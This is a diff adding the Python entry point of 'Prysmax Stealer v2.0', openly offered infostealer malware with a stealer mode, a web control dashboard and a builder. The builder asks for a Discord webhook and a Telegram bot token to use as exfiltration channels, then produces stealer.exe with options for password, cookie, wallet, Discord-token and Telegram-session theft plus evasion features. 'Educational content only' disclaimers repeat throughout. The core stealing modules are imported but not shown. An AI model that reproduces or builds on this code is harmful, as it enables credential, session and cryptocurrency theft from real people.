@@ -1,0 +1,231 @@
+#!/usr/bin/env python3
+"""
+Prysmax Stealer - Main Entry Point
+Educational content only
+
+This is a comprehensive stealer application with web dashboard interface
+developed for educational and research purposes only.
+
+Features:
+- Advanced web dashboard with real-time statistics
+- Multi-browser password and cookie extraction
+- Cryptocurrency wallet stealing
+- Discord token grabbing
+- Telegram session hijacking
+- Screenshot capture
+- System information collection
+- Advanced protection and evasion techniques
+- Builder interface for custom builds
+- Multiple delivery methods (Discord, Telegram)
+
+Usage:
+    python main.py --mode [stealer|dashboard|builder]
+    
+    stealer   - Run the stealer functionality
+    dashboard - Start the web dashboard server
+    builder   - Build custom stealer executable
+"""
+
+import os
+import sys
+import argparse
+import json
+from pathlib import Path
+
+# Add project root to Python path
+project_root = Path(__file__).parent
+sys.path.insert(0, str(project_root))
+
+def run_stealer():
+    """Run the stealer functionality"""
+    try:
+        from core.stealer import PrysmaxStealer
+        
+        print("=" * 60)
+        print("🔥 PRYSMAX STEALER v2.0")
+        print("=" * 60)
+        print("Educational content only")
+        print()
+        
+        stealer = PrysmaxStealer()
+        stealer.run_stealer()
+        
+    except Exception as e:
+        print(f"[ERROR] Stealer execution failed: {e}")
+        return False
+    
+    return True
+
+def run_dashboard():
+    """Start the web dashboard server"""
+    try:
+        print("=" * 60)
+        print("🌐 PRYSMAX WEB DASHBOARD")
+        print("=" * 60)
+        print("Starting web dashboard server...")
+        print("Access the dashboard at: http://localhost:5000")
+        print("Default credentials: admin / prysmax123")
+        print()
+        
+        # Add web directory to path
+        web_dir = project_root / "web"
+        sys.path.insert(0, str(web_dir))
+        
+        # Import and run Flask app
+        from web.app import app, init_db
+        
+        # Initialize database
+        init_db()
+        
+        # Start server
+        app.run(host='0.0.0.0', port=5000, debug=False)
+        
+    except Exception as e:
+        print(f"[ERROR] Dashboard startup failed: {e}")
+        return False
+    
+    return True
+
+def run_builder():
+    """Run the stealer builder"""
+    try:
+        from builder.builder import StealerBuilder
+        
+        print("=" * 60)
+        print("🔨 PRYSMAX STEALER BUILDER")
+        print("=" * 60)
+        print("Educational content only")
+        print()
+        
+        # Load configuration
+        config_path = project_root / "config" / "config.json"
+        with open(config_path, 'r') as f:
+            config = json.load(f)
+        
+        # Example build configuration
+        build_config = {
+            "filename": "stealer.exe",
+            "webhook_url": input("Enter Discord webhook URL: ").strip(),
+            "telegram_config": {
+                "bot_token": input("Enter Telegram bot token (optional): ").strip(),
+                "chat_id": input("Enter Telegram chat ID (optional): ").strip()
+            },
+            "features": {
+                "passwords": True,
+                "cookies": True,
+                "discord_tokens": True,
+                "wallets": True,
+                "telegram": True,
+                "screenshot": True
+            },
+            "protection": {
+                "anti_debug": False,
+                "startup": False,
+                "melt": False,
+                "upx_packing": False,
+                "crypto_clipper": False
+            }
+        }
+        
+        if not build_config["webhook_url"]:
+            print("[ERROR] Discord webhook URL is required!")
+            return False
+        
+        # Build stealer
+        builder = StealerBuilder(config)
+        result = builder.build_stealer(build_config)
+        
+        if result:
+            print(f"[SUCCESS] Stealer built successfully: {result}")
+        else:
+            print("[ERROR] Build failed!")
+            return False
+        
+    except Exception as e:
+        print(f"[ERROR] Builder execution failed: {e}")
+        return False
+    
+    return True
+
+def show_banner():
+    """Display application banner"""
+    banner = """
+    ██████╗ ██████╗ ██╗   ██╗███████╗███╗   ███╗ █████╗ ██╗  ██╗
+    ██╔══██╗██╔══██╗╚██╗ ██╔╝██╔════╝████╗ ████║██╔══██╗╚██╗██╔╝
+    ██████╔╝██████╔╝ ╚████╔╝ ███████╗██╔████╔██║███████║ ╚███╔╝ 
+    ██╔═══╝ ██╔══██╗  ╚██╔╝  ╚════██║██║╚██╔╝██║██╔══██║ ██╔██╗ 
+    ██║     ██║  ██║   ██║   ███████║██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
+    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+    
+    Advanced Stealer & Dashboard Platform v2.0
+    Educational content only - Use responsibly
+    
+    Telegram: @prysmaxc2 | Web: prysmax.club
+    """
+    print(banner)
+
+def main():
+    """Main entry point"""
+    show_banner()
+    
+    parser = argparse.ArgumentParser(
+        description="Prysmax Stealer - Advanced Information Gathering Tool",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+    python main.py --mode dashboard    # Start web dashboard
+    python main.py --mode stealer      # Run stealer functionality  
+    python main.py --mode builder      # Build custom executable
+        """
+    )
+    
+    parser.add_argument(
+        '--mode', 
+        choices=['stealer', 'dashboard', 'builder'],
+        default='dashboard',
+        help='Operation mode (default: dashboard)'
+    )
+    
+    parser.add_argument(
+        '--config',
+        default='config/config.json',
+        help='Configuration file path'
+    )
+    
+    parser.add_argument(
+        '--version',
+        action='version',
+        version='Prysmax Stealer v2.0'
+    )
+    
+    args = parser.parse_args()
+    
+    # Verify configuration file exists
+    config_path = project_root / args.config
+    if not config_path.exists():
+        print(f"[ERROR] Configuration file not found: {config_path}")
+        return 1
+    
+    # Execute based on mode
+    success = False
+    
+    if args.mode == 'stealer':
+        success = run_stealer()
+    elif args.mode == 'dashboard':
+        success = run_dashboard()
+    elif args.mode == 'builder':
+        success = run_builder()
+    
+    return 0 if success else 1
+
+if __name__ == "__main__":
+    try:
+        exit_code = main()
+        sys.exit(exit_code)
+    except KeyboardInterrupt:
+        print("\n[INFO] Operation cancelled by user")
+        sys.exit(0)
+    except Exception as e:
+        print(f"\n[FATAL] Unexpected error: {e}")
+        sys.exit(1)
+
